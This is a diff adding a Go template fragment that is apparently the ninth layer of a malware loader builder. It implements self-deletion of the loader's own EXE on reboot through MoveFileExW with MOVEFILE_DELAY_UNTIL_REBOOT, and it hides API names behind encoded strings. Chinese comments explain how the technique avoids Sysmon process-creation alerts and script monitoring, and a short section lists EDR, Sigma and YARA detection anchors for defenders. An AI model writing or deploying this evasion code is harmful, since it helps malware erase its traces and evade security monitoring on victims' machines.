@@ -1,0 +1,66 @@
+{{define "_cleanup"}}
+// ============================================================
+// 第9层：自删除 — 重启时由系统清理自身 EXE
+// ============================================================
+//
+// 【原理】
+//   Windows API MoveFileExW 配合 MOVEFILE_DELAY_UNTIL_REBOOT (0x4) 标志，
+//   会在注册表 PendingFileRenameOperations 中写入一条记录：
+//     HKLM\SYSTEM\CurrentControlSet\Control\Session Manager
+//       PendingFileRenameOperations = "\??\C:\path\to\loader.exe" → ""
+//   下次系统重启时，Session Manager (smss.exe) 在用户态启动前执行该删除。
+//   目标路径为空字符串 = 删除操作（非重命名）。
+//
+// 【为什么选择这种方式】
+//   - 不需要额外进程或 cmd.exe 子进程（避免 Sysmon EventID 1 告警）
+//   - 不依赖 bat/ps1 脚本（避免脚本引擎监控）
+//   - 文件在运行期间仍被锁定，MoveFileEx 只是注册延迟操作，不会立即失败
+//   - 比 DeleteFile + 重试循环更隐蔽
+//
+// 【EDR 检测锚点 — 蓝队参考】
+//   - 注册表监控:
+//       * 写入 PendingFileRenameOperations 的进程不是安装程序/更新程序
+//       * Sysmon EventID 13 (RegistryEvent SetValue) 目标为上述键值
+//       * Sigma 规则: 非系统进程写入 Session Manager\PendingFileRenameOperations
+//   - API 调用监控:
+//       * MoveFileExW 第三参数包含 MOVEFILE_DELAY_UNTIL_REBOOT (0x4)
+//       * 调用者对自身 EXE 路径执行此操作（自删除行为特征）
+//   - 文件系统:
+//       * 重启后文件消失，但 $MFT 中仍有记录（取证可恢复）
+//   - YARA 规则:
+//       * 同一二进制中同时引用 GetModuleFileNameW + MoveFileExW
+//       * 常量 0x4 (MOVEFILE_DELAY_UNTIL_REBOOT) 作为参数出现
+
+// selfDeleteOnReboot 将自身 EXE 标记为重启时删除
+// 通过 MoveFileExW + MOVEFILE_DELAY_UNTIL_REBOOT 实现
+func selfDeleteOnReboot() {
+	k32 := kernel32()
+
+	// 获取自身 EXE 完整路径
+	getModFileName := getProcAddr(k32, ds("{{index .EncodedStrings "GetModuleFileNameW"}}"))
+	if getModFileName == 0 {
+		return
+	}
+	buf := make([]uint16, 260)
+	ret, _, _ := syscall.Syscall(getModFileName, 3,
+		0, // hModule = NULL → 当前 EXE
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(len(buf)))
+	if ret == 0 {
+		return
+	}
+
+	// MoveFileExW(lpExistingFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)
+	// lpNewFileName = NULL + MOVEFILE_DELAY_UNTIL_REBOOT = 重启时删除
+	moveFileEx := getProcAddr(k32, ds("{{index .EncodedStrings "MoveFileExW"}}"))
+	if moveFileEx == 0 {
+		return
+	}
+
+	const MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
+	syscall.Syscall(moveFileEx, 3,
+		uintptr(unsafe.Pointer(&buf[0])),
+		0, // NULL → 删除而非重命名
+		MOVEFILE_DELAY_UNTIL_REBOOT)
+}
+{{end}}
